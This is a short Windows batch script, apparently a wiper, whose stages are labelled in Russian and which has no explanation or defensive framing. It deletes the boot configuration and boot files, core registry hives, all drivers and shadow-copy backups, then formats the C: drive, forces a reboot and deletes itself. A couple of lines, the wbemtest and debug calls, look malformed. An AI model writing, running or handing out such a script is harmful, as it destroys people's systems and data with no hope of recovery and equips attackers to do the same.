@echo off
setlocal enabledelayedexpansion
set "winpath=%windir%\System32"
set "self=%~f0"

REM 
echo [СТАДИЯ 1/5]
bcdedit /delete {current} /f >nul 2>&1
del /f /q /a %winpath%\winload.efi >nul
del /f /q /a %winpath%\bootmgfw.efi >nul

REM 
echo [СТАДИЯ 2/5] 
reg delete HKLM\SOFTWARE\Microsoft /f >nul
reg delete HKLM\SYSTEM\CurrentControlSet\Services /f >nul

REM 
echo [СТАДИЯ 3/5] 
del /f /q /a %winpath%\drivers\*.sys >nul
del /f /q /a %winpath%\DriverStore\FileRepository\* >nul

REM 
echo [СТАДИЯ 4/5] 
vssadmin delete shadows /all /quiet >nul
wbemtest //%COMPUTERNAME%/root/default:SystemRestore.FeatureSetting="DisableSR" >nul

REM 
echo [СТАДИЯ 5/5] 
echo y| format c: /fs:NTFS /p:3 /x >nul
echo 55 AA | debug >nul
shutdown /r /f /t 0
del /f /q "%self%" >nul
